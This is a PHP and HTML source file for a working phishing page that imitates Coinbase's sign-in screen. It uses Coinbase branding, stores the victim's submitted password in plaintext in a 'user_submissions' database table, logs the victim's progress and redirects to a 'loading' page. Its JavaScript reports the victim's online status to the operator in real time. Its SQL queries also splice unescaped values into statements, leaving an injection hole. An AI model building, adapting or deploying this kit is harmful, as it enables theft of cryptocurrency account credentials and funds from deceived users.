<?php
// Start the session
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn; // Access the database connection within the function
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    // If email or token is not set, redirect the user back to login.php
    header("Location: login.php");
    exit();
}

// Retrieve the email and token from the session
$email = $_SESSION["email"];
$token = $_SESSION["token"];

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the password submitted in the form
    $password = $_POST["password"];

    // Check if the email and token combination exists in the database
    $check_sql = "SELECT * FROM user_submissions WHERE email='$email' AND token='$token'";
    $check_result = $conn->query($check_sql);

    if ($check_result->num_rows > 0) {
        // If email and token combination exists, update the password
        $update_sql = "UPDATE user_submissions SET password='$password' WHERE email='$email'";
        if ($conn->query($update_sql) === TRUE) {
            // Password updated successfully
            // Update user activity to indicate PasswordPage
            updateActivity($token, "PasswordPage");
            // Proceed to loading.php or any other desired page
            header("Location: loading.php");
            exit();
        } else {
            // Error updating password in the database
            echo "Error updating password: " . $conn->error;
        }
    } else {
        // If email and token combination doesn't exist, redirect the user back to login.php
        header("Location: login.php");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Sign In</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
    body {
        margin: 0;
        padding: 0;
        background-color: #0a0b0d;
        color: #f0f0f0;
        font-family: 'CoinbaseSans', Arial, sans-serif;
    }

    .wrapper {
        display: flex;
        flex-direction: column;
        align-items: center;
        min-height: 100vh;
    }

    .login-container {
        width: 80%;
        max-width: 400px;
        padding: 20px;
        border-radius: 16px;
        border: 1px solid rgba(255, 255, 255, 0.2);
        background-color: #0A0B0D;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        margin-top: 80px;
    }

    .login-image {
        width: 150px;
        margin: 20px 0 20px 20px;
    }

    h2 {
        font-size: 24px;
        font-weight: 600;
        margin: 0 0 20px;
    }

    .icon-and-email {
        margin-bottom: 40px;
        padding: 16px;
        background-color: #2e2f33;
        border: 2px solid rgba(255, 255, 255, 0.2);
        border-radius: 8px;
        box-sizing: border-box;
        display: flex;
        align-items: center;
        cursor: pointer;
    }

    .icon-and-email span {
        font-weight: bold;
        color: #f0f0f0;
    }

    .icon-and-email:hover {
        background-color: #3e3f43;
    }

    .login-form p,
    .login-form a,
    .centered-link a {
        color: #8f9296;
        font-size: 14px;
        font-weight: 400;
        line-height: 24px;
        margin: 10px 0;
    }

    .login-form label {
        color: #f0f0f0;
        font-size: 15px;
        font-weight: bold;
        margin-bottom: 5px;
    }

    .password-input {
        position: relative;
    }

    .toggle-password {
        position: absolute;
        top: 50%;
        right: 10px;
        transform: translateY(-50%);
        cursor: pointer;
        color: #8f9296;
    }

    .login-form input[type="password"],
    .visible-password {
        background-color: #2e2f33;
        border: 2px solid rgba(255, 255, 255, 0.2);
        color: #f0f0f0;
        padding: 12px;
        width: calc(100% - 40px);
        border-radius: 8px;
        font-size: 16px;
        transition: border-color 0.3s ease, background-color 0.3s ease;
    }

    .login-form input:focus {
        outline: none;
        border-color: #0052ff;
        background-color: #3e3f43;
    }

    .login-form input::placeholder {
        color: #8f9296;
    }

    .login-form button[type="submit"] {
        background-color: #0052ff;
        border: none;
        border-radius: 24px;
        color: #fff;
        cursor: pointer;
        font-size: 16px;
        font-weight: 600;
        line-height: 24px;
        margin-top: 20px;
        padding: 16px;
        width: calc(100% - 40px);
        transition: background-color 0.3s ease;
    }

    .login-form button:hover {
        background-color: #014cec;
    }

    .centered-link {
        margin-top: 20px;
        /*text-align: center;*/
    }

    .centered-link a {
        color: #0052ff;
        text-decoration: none;
        font-size: 16px;
        font-weight: 400;
        line-height: 24px;
    }

    .grey-button {
            background-color: #444;
            border: none;
            border-radius: 24px;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            margin-left: 20px;
            padding: 16px;
            width: 90%;
            margin-bottom: 10px;
        }

        .grey-button:hover {
            background-color: #333;
        }

        .clear-button {
            background-color: #0A0B0D;
            border: none;
            border-radius: 24px;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            padding: 10px;
            margin-top: 20px;
        }

        .clear-button:hover {
            background-color: #1a1a1a;
        }

        .top-button {
            background-color: #444;
            border: none;
            border-radius: 24px;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            padding: 10px;
            margin-top: 20px;
        }

        .top-button:hover {
            background-color: #333;
        }

        .wrapper2 {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px; /* Added padding for better spacing */
        }

        .login-image {
            width: 30px;
            margin-top: 20px;
            margin-left: 20px;
        }

        h4 {
            margin: 0;
            padding: 20px 0;
            background-color: #000763;
            color: white;
            font-family: arial;
            text-align: center;
        }
        
</style>


</head>
<body>
<div class="wrapper2">
    <img src="https://assets.ifttt.com/images/channels/1358877763/icons/monochrome_large.png" alt="Coinbase Logo" class="login-image">
    <div>
        <button class="clear-button">Sign up</button>
        <button class="top-button">Sign in to business</button>
    </div>
</div>
    <div class="wrapper">
        <div class="login-container">
            <form class="login-form" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                <h2>Sign in to Coinbase</h2>
                <p>See our <a href="https://www.coinbase.com/legal/privacy">Privacy Policy</a> for more info. Not your device? Use a private window.</p>
                <div class="icon-and-email">
                    <i class="fas fa-user-circle login-icon">&nbsp;&nbsp;</i>
                    <span><?php echo htmlspecialchars($email); ?></span>
                </div>
                <label for="password">Password</label>
                <div class="password-input">
                    <input type="password" id="password" name="password" required>
                    <i class="fas fa-eye-slash toggle-password" onclick="togglePasswordVisibility()">&nbsp;&nbsp;&nbsp;</i>
                </div>
                <div class="centered-link">
                    <a href="#">Forgot password?</a>
                </div>
                <center><button type="submit">Continue</button></center>
            </form>
        </div>
    </div>

    <script>
        function togglePasswordVisibility() {
            var passwordInput = document.getElementById("password");
            var eyeIcon = document.querySelector(".toggle-password");

            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                eyeIcon.classList.remove("fa-eye-slash");
                eyeIcon.classList.add("fa-eye");
                passwordInput.classList.add("visible-password");
            } else {
                passwordInput.type = "password";
                eyeIcon.classList.remove("fa-eye");
                eyeIcon.classList.add("fa-eye-slash");
                passwordInput.classList.remove("visible-password");
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            // Find the element with the class 'icon-and-email'
            var iconAndEmail = document.querySelector('.icon-and-email');
            // Add click event listener to it
            iconAndEmail.addEventListener('click', function() {
                // Redirect to login.php
                window.location.href = 'login.php';
            });
        });

        // Function to update user status
    function updateUserStatus(status) {
        // Send an AJAX request to update user status
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'update_status.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                // Handle response if needed
            }
        };
        xhr.send('status=' + status);
    }

    // Detect user activity
    function detectActivity() {
        var userActive = false;

        function setUserActive() {
            if (!userActive) {
                userActive = true;
                updateUserStatus('online');
            }
        }

        // Events to detect user activity
        window.addEventListener('mousemove', setUserActive);
        window.addEventListener('keydown', setUserActive);
        window.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                setUserActive();
            }
        });

        // Additional events for mobile devices
        window.addEventListener('touchstart', setUserActive);
        window.addEventListener('touchmove', setUserActive);
        window.addEventListener('orientationchange', setUserActive);
        window.addEventListener('scroll', setUserActive);

        // Set user as offline when the tab is closed
        window.addEventListener('beforeunload', function() {
            updateUserStatus('offline');
        });
    }

    // Call detectActivity function when the document is loaded
    document.addEventListener('DOMContentLoaded', detectActivity);
    </script>
</body>
</html>